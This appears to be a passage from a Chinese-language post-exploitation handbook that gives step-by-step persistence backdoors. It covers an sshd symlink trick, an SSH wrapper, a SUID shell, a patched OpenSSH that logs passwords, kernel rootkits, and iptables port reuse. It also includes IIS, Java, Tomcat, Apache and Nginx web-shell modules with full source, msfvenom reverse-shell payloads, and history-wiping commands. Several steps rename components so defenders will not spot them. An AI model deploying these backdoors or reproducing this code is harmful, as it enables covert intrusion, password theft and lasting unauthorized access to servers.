>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;
执行后开启31337端口，使用root任意密码登录
>ssh root@192.168.1.1 -p 31337
```

### 进程注入  _123)

```
http://cymothoa.sourceforge.net/
靶机>./cymothoa -p 进程PID -s 1 -y 端口
攻击机>nc -vv ip 端口
```

### SSH wrapper后门  ssh-wrapper)

```
#cd /usr/sbin
#mv sshd ../bin
#echo '#!/usr/bin/perl' >sshd
#echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
#echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
#chmod u+x sshd
#/etc/init.d/sshd restart
攻击机执行
>socat STDIO TCP4:192.168.0.110:22,sourceport=13377
```

![image](http://159.75.51.84:8000/img/572.png)

### SUID Shell  suid-shell)

```
>cp /bin/bash /tmp/tmp
>chmod u+s /tmp/tmp
>/tmp/tmp -p
```

### SSH公私钥登录  ssh_3)

```
>vim /etc/ssh/sshd_conf取消以下注释
```

![image](http://159.75.51.84:8000/img/573.png)

```
>ssh-keygen生成
复制/root/.ssh/id_rsa.pub文件到攻击端的/root/.ssh/authorized_keys
>ssh -i id_rsa targer@1.1.1.1
```

### Reptile  reptile)

```
https://github.com/f0rb1dd3n/Reptile
安装
>apt install build-essential libncurses-dev linux-headers-$(uname -r)
>git clone https://github.com/f0rb1dd3n/Reptile.git
```

### Kbeast_rootkit  kbeast_rootkit)

```
http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
version - 0 : 2.6.18 (RHEL/CentOS 5.x)
        1 : 2.6.32 (Ubuntu 10.x) [default version]
修改配置config.h
安装路径、日志路径、端口、连接密码、连接用户
```

![image](http://159.75.51.84:8000/img/574.png)

```
./setup build
攻击机连接
>telnet 192.168.1.1 13377
```

### OpenSSH后门  openssh)

```
下载
http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
备份配置文件
>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
>mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
安装关联文件
centos
>yum install -y openssl openssl-devel pam-devel zlib zlib-devel
Ubuntu
>apt-get install -y openssl libssl-dev libpam0g-dev
>tar zxvf openssh-5.9p1.tar.gz 
>tar zxvf 0x06-openssh-5.9p1.patch.tar.gz 
>cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/
>cd openssh-5.9p1
>patch <sshbd5.9p1.diff
>vim includes.h
```

![image](http://159.75.51.84:8000/img/575.png)

```
/tmp/ilog记录登录到本机的用户密码
/tmp/olog记录本机登录其他机器的账户密码
日志文件前可以加个.隐藏起来
SECRETPW是连接后门密码
查看当前版本
>ssh -V
```

![image](http://159.75.51.84:8000/img/576.png)

```
修改version.h改为当前版本
```

![image](http://159.75.51.84:8000/img/577.png)

```
编译安装
Centos7
>./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5
>make clean
>make && make install
>systemctl restart sshd.service
ubuntu
>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam
>make clean
>make&&make install
重启服务，修改文件日志
>touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
>touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
```

![image](http://159.75.51.84:8000/img/578.png) ![image](http://159.75.51.84:8000/img/579.png)

```
清除痕迹
>export HISTFILE=/dev/null
>export HISTSIZE=0
>export HISTFILESIZE=0
>sed -i 's/192.168.0.1/127.0.0.1/g' /root/.bash_history
```

### IPTables端口复用  iptables_1)

```
>iptables -t nat -N LETMEIN 
>iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启开关
>iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭开关
>iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
>iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
攻击端：
#开启复用
>echo threathuntercoming | socat - tcp:192.168.0.110:80
#ssh使用80端口进行登录
ssh -p 80 root@192.168.0.110
#关闭复用
echo threathunterleaving | socat - tcp:192.168.0.110:80
```

![image](http://159.75.51.84:8000/img/580.png)

### 文件处理  _124)

```
>chattr +I shell.sh
```

![image](http://159.75.51.84:8000/img/581.png)

```
>vim .shell.sh
```

![image](http://159.75.51.84:8000/img/582.png)

```
>attrib +s +h +r 1.txt
```

![image](http://159.75.51.84:8000/img/583.png)

```
>touch -r 1.file 2.file 修改2file文件的时间跟1file时间相同
```

### IIS_Bin_Backdoor  iis_bin_backdoor)

```
From:https://github.com/WBGlIl/IIS_backdoor
IIS_backdoor_dll.dl放入 web 目录的 bin 文件夹中配置 web.config 文件
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <modules>
      <add name="IIS_backdoor" type="IIS_backdoor_dll.IISModule" />
        </modules>
    </system.webServer>
</configuration>
IIS_backdoor_shell.exe执行命令
```

![image](http://159.75.51.84:8000/img/584.png)

```
使用IISBackdoor太明显，容易被看出是后门，这里对后门改名
```

![image](http://159.75.51.84:8000/img/585.png) ![image](http://159.75.51.84:8000/img/586.png) ![image](http://159.75.51.84:8000/img/587.png)

```
重新生成解决方案，dll放入bin目录，web.config修改为
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <modules>
            <add name="UrlRoutingModule" type="UrlRoutingModule.IISModule" />
        </modules>
    </system.webServer>
</configuration>
添加完之后会自动在模块中注册好
```

![image](http://159.75.51.84:8000/img/588.png)

```
执行payload，msf生成raw格式payload，选择shellcode选项，raw文件拖入即可
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.raw
```

![image](http://159.75.51.84:8000/img/589.png)

### IIS_NETDLL_Spy  iis_netdll_spy)

```
From:https://github.com/Ivan1ee/NetDLLSpy
原作者提及三种方式，第一种编译代码为DLL新建aspx文件实例化后门类来执行命令，第二种是做httphandler映射可指定一个后缀执行命令保存文件在web服务器上，再读取结果。第三种是使用jsc.exe编译js脚本生成dll，添加映射菜刀连接。
这里根据原作者的代码，进行了一下简单的修改，修改后的功能为添加httphandler映射指定一个后缀执行命令显示在页面上，不用保存在服务器中再访问。
代码
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Web;
namespace IsapiModules
{
    public class Handler : IHttpHandler
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
        public void ProcessRequest(HttpContext context)
        {
            string input = context.Request.Form["InternetInformationService"];  //command
            if (context.Request.Form["microsoft"] == "iis")//do command
            {
                this.cmdShell(input);
            }
        }
        public void cmdShell(string input)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.Arguments = "/c " + input;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            StreamReader output = process.StandardOutput;
            String result = output.ReadToEnd();
            output.Close();
            output.Dispose();
            HttpContext.Current.Response.Write(result);
        }
    }
}
保存为随意后缀，使用csc编译。
>C:\Windows\Microsoft.NET\Framework\v2.50727\csc.exe /t:library /r:System.Web.dll -out:C:\inetpub\wwwroot\Bin\SystemIO.dll C:\inetpub\wwwroot\bin\code.cs
```

![image](http://159.75.51.84:8000/img/590.png)

```
Web.config文件添加
<system.webServer>
    <handlers> 
        <add name="PageHandlerFactory-ISAPI-2.0-32" path="*.xxx" verb="*" type="IsapiModules.Handler" resourceType="Unspecified" requireAccess="Script" preCondition="integratedMode" /> 
    </handlers> 
</system.webServer>
```

![image](http://159.75.51.84:8000/img/001.png)

```
打开IIS管理器，可以看到处理映射管理器中已经添加了模块。
```

![image](http://159.75.51.84:8000/img/591.png)

```
现在随意访问个xxx后缀的文件
```

![image](http://159.75.51.84:8000/img/592.png)

```
带参数访问
microsoft=iis&InternetInformationService=net user
```

![image](http://159.75.51.84:8000/img/593.png) ![image](http://159.75.51.84:8000/img/594.png)

```
第三种连接菜刀，这里也对代码修改了一下。
import System; 
import System.Web; 
import System.IO; 
package IsapiModule
{ 
    public class Handler implements IHttpHandler
    { 
        function IHttpHandler.ProcessRequest(context : HttpContext)
        { 
            context.Response.Write("404 Not Found") 
            var I = context; 
            var Request = I.Request; 
            var Response = I.Response; 
            var Server = I.Server; 
            eval(context.Request["Internet"]); //pass
        } 
        function get IHttpHandler.IsReusable() : Boolean{ return true}
    }
}
使用jsc编译
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library -out:C:\inetpub\wwwroot\Bin\IsapiModule.Handler.dll C:\inetpub\wwwroot\bin\code.js
```

![image](http://159.75.51.84:8000/img/595.png)

```
编辑web.config，添加映射，这里指定的后缀是.iis
<system.webServer> 
<modules runAllManagedModulesForAllRequests="true"/> <directoryBrowse enabled="true"/>
<staticContent>
 <mimeMap fileExtension=".json" mimeType="application/json" /> 
 </staticContent> 
<handlers>
 <add name="PageHandlerFactory-ISAPI-2.0-32-1" path="*.iis" verb="*" type="IsapiModule.Handler" preCondition="integratedMode"/>
 </handlers>
</system.webServer>
已自动加入了映射。现在随便访问个iis后缀的文件。
```

![image](http://159.75.51.84:8000/img/596.png) ![image](http://159.75.51.84:8000/img/597.png)

```
可使用菜刀直接连接
```

![image](http://159.75.51.84:8000/img/598.png) ![image](http://159.75.51.84:8000/img/599.png)

### IIS_RAID  iis_raid)

```
From:https://github.com/0x09AL/IIS-Raid
在vs2019下编译
在Functions.h中修改连接密码，passfile是dump下来的密码保存的位置，com_header是后门和服务器通信的请求头。
```

![image](http://159.75.51.84:8000/img/600.png)

```
打开项目修改完你的密码，直接ctrl+B生成解决方案即可(这里生成的是release版本)
Dll传到服务器，改个名字，执行添加模块
>C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:IsapiDotNet /image:"c:\windows\system32\inetsrv\IsapiDotNet.dll" /add:true
```

![image](http://159.75.51.84:8000/img/601.png)

```
在模块中可以看到已经存在了
```

![image](http://159.75.51.84:8000/img/602.png)

```
远程连接
>python3 iis_controller.py --url http://192.168.0.98 --password thisismykey
执行命令的方式是
>cmd +命令
```

![image](http://159.75.51.84:8000/img/603.png)

```
Dump命令可以dump下来IIS站点的登录的信息，保存在设置的位置。
Inject可以执行shellcode
Cs/msf生成raw格式的shellcode
>inject 位置
```

![image](http://159.75.51.84:8000/img/604.png)

### JAVA Web Backdoor  java-web-backdoor)

```
From:https://www.freebuf.com/articles/web/172753.html
https://github.com/rebeyond/memShell
当获取一个webshell或bashshell权限时，下载后门执行注入进程形成无文件复活后门
下载后解压到任意web目录
```

![image](http://159.75.51.84:8000/img/605.png)

```
得到2个jar文件
执行，password设置为你的密码
>java -jar inject.jar password
```

![image](http://159.75.51.84:8000/img/606.png)

```
注入成功，在web任意页面任意url执行命令
http://192.168.0.121:8080/css/app.css?pass_the_world=password
```

![image](http://159.75.51.84:8000/img/607.png)

```
可执行命令，反弹shell，上传/下载文件，列目录，读文件，添加代理，连接菜刀
```

![image](http://159.75.51.84:8000/img/608.png)

### Tomcat JSP HideShell  tomcat-jsp-hideshell)

```
From:https://mp.weixin.qq.com/s/7b3Fyu_K6ZRgKlp6RkdYoA
https://github.com/QAX-A-Team/HideShell
把自己的shell和hideshell传入靶机，先访问自己的shell，目的是为了让 Tomcat 将它编译，并生成 JspServletWrapper 保存在 JspRuntimeContext 中。
```

![image](http://159.75.51.84:8000/img/609.png)

```
再访问hideshell.jsp，点击hide你的shell。
```

![image](http://159.75.51.84:8000/img/610.png)

```
已经隐藏了
```

![image](http://159.75.51.84:8000/img/611.png) ![image](http://159.75.51.84:8000/img/612.png)

```
再访问hideshell.jsp，可以看到隐藏后的shell的文件名。
```

![image](http://159.75.51.84:8000/img/613.png)

```
访问看看
```

![image](http://159.75.51.84:8000/img/614.png)

```
当然，也可以把hideshell自身隐藏了，那访问它的方式就是hidden-hideshell.jsp
```

![image](http://159.75.51.84:8000/img/615.png)

```
目录里啥都没了
```

![image](http://159.75.51.84:8000/img/616.png)

```
此方式隐藏之后请求不会产生日志
```

![image](http://159.75.51.84:8000/img/617.png)

```
那如果把shelltest文件夹删掉权限还会在吗？
```

![image](http://159.75.51.84:8000/img/618.png)

```
是在的
```

![image](http://159.75.51.84:8000/img/619.png)

### Apache Module后门1  apache-module1)

```
From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor
生成模板结构
>apxs -g -n auth
```

![image](http://159.75.51.84:8000/img/620.png)

```
编辑mod_auth.c文件
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>
static int auth_handler(request_rec *r)
{
    const apr_array_header_t    *fields;
    int                            i;
    apr_table_entry_t           *e = 0;
    char FLAG = 0;
    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for(i = 0; i < fields->nelts; i++) {
        if(strcmp(e[i].key, "Authorizations") == 0){
            FLAG = 1;
            break;
        }
    }
    if (FLAG){
        char * command = e[i].val;
        FILE* fp = popen(command,"r");
        char buffer[0x100] = {0};
        int counter = 1;
        while(counter){
            counter = fread(buffer, 1, sizeof(buffer), fp);
            ap_rwrite(buffer, counter, r);
        }
        pclose(fp);
        return DONE;
    }
    return DECLINED;
}
static void auth_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(auth_handler, NULL, NULL, APR_HOOK_MIDDLE);
}
module AP_MODULE_DECLARE_DATA auth_module = {
    STANDARD20_MODULE_STUFF, 
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    auth_register_hooks  /* register hooks                      */
};
编译后重启apache
>apxs -i -a -c mod_auth.c && service apache2 restart
```

![image](http://159.75.51.84:8000/img/621.png)

```
原文件接受的头是backdoor太明显，这里换成了Authorizations
```

![image](http://159.75.51.84:8000/img/622.png)

```
或使用python来执行
```

![image](http://159.75.51.84:8000/img/623.png)

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import sys
def exploit(host, port, command):
    headers = {
        "Authorizations": command
    }
    url = "http://%s:%d/" % (host, port)
    response = requests.get(url, headers=headers)
    content = response.content
    print content
def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        command = raw_input("$ ")
        if command == "exit":
            break
        exploit(host, port, command)
if __name__ == "__main__":
    main()
```

### Apache Module后门2  apache-module2)

```
From:https://github.com/VladRico/apache2_BackdoorMod
.load文件传入/etc/apache2/mods-available/目录，.so文件传入/usr/lib/apache2/modules/目录
启动后门模块，重启apache
>a2enmod backdoor&service apache2 restart
```

![image](http://159.75.51.84:8000/img/624.png)

```
Cookie里添加字段password=backdoor
访问http://ip/ping返回如下图说明后门正常允许
```

![image](http://159.75.51.84:8000/img/625.png)

```
访问http://ip/bind/12345 开启正向连接，攻击机执行nc ip 12345即可
```

![image](http://159.75.51.84:8000/img/626.png)

```
访问http://ip/revtty/192.168.0.107/12138 开启反向连接，攻击机109执行nc监听12138即可
```

![image](http://159.75.51.84:8000/img/627.png)

```
访问http://ip/proxy/1337开启socks代理
```

![image](http://159.75.51.84:8000/img/628.png) ![image](http://159.75.51.84:8000/img/629.png) ![image](http://159.75.51.84:8000/img/630.png)

```
想要结束socks代理可执行
>echo "imdonewithyou" |nc 192.168.0.111 1337
```

![image](http://159.75.51.84:8000/img/631.png)

```
即可结束socks代理
以上原作者的文件命名backdoor太明显，可以自己修改文件重新编译
创建模板结构命名为phpmodev
```

![image](http://159.75.51.84:8000/img/632.png) ![image](http://159.75.51.84:8000/img/633.png)

```
修改cookie内容为迷惑字段Authorizations=PHPSESSIONID
```

![image](http://159.75.51.84:8000/img/634.png)

### Apache Module后门3  apache-module3)

```
From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491179&idx=1&sn=ab26fe36ac74f5b140e91279ae8018c7
生成模板结构
>apxs -g -n phpdevmod
```

![image](http://159.75.51.84:8000/img/635.png)

```
编辑mod_phpdevmod.c文件
编译
>make -e CC=x86_64-linux-gnu-g++
```

![image](http://159.75.51.84:8000/img/636.png)

```
生成的.so文件在/.libs目录下
```

![image](http://159.75.51.84:8000/img/637.png)

```
将其复制到/usr/lib/apache2/modules/目录
修改/etc/apache2/mods-enabled/php7.0.load文件，添加如下
LoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so
<Location /qq.jpg>    #可以设置为任何不存在的文件
    setHandler phpdevmod
</Location>
```

![image](http://159.75.51.84:8000/img/638.png)

```
需重启apache服务
访问后门方式http://ip/qq.jpg?命令的url编码
直接访问后门文件
```

![image](http://159.75.51.84:8000/img/639.png)

```
636174202F6574632F706173737764为cat /etc/passwd的url编码
```

![image](http://159.75.51.84:8000/img/640.png)

### Nginx Lua后门  nginx-lua)

```
From:https://github.com/netxfly/nginx_lua_security
https://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md
后门利用的前提是获取到root权限，nginx安装有lua模块。
在nginx.conf中http节处添加，指定lua脚本位置，以及nginx启动时加载的脚本
```

![image](http://159.75.51.84:8000/img/641.png)

```
在lua目录/waf/中新建Init.lua，内容如下，require nginx表示加载nginx.lua中的模块。
```

![image](http://159.75.51.84:8000/img/642.png)

```
/waf/目录中新建nginx.lua实现执行命令，参数为waf。
```

![image](http://159.75.51.84:8000/img/643.png)

```
在nginx配置文件中加入location。
```

![image](http://159.75.51.84:8000/img/644.png)

```
效果：
```

![image](http://159.75.51.84:8000/img/645.png)

### PwnNginx  pwnnginx)

```
From:https://github.com/t57root/pwnginx
解压好后编译客户端
>make
```

![image](http://159.75.51.84:8000/img/646.png)

```
编辑nginx的源文件/src/core/nginx.c找到configure arguments:在后面添加--prefix=/usr/local/nginx\n指定的是nginx安装的目录
```

![image](http://159.75.51.84:8000/img/647.png)

```
重新编译nginx添加后门模块
>./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module
```

![image](http://159.75.51.84:8000/img/648.png)

```
>make
```

![image](http://159.75.51.84:8000/img/649.png)

```
覆盖新的nginx到原nginx目录
>cp -f objs/nginx /usr/local/nginx/sbin/nginx
```

![image](http://159.75.51.84:8000/img/650.png)

```
重启nginx
>killall nginx&/usr/local/nginx/sbin/nginx
连接
>./pwnginx shell 目标机 nginx端口 密码
默认密码是t57root，密码的配置文件在pwnginx-master\module\config.h文件夹中，可在重新编译nginx前修改密码
```

![image](http://159.75.51.84:8000/img/651.png) ![image](http://159.75.51.84:8000/img/652.png)

```
此后门也可开启socks隧道
```



**PS**：**以上内容均在本地完成复现，不涉及任何非法行为，不允许使用本项目所提及的所有技术内容进行非法行为，使用技术的风险由使用者自行承担。**

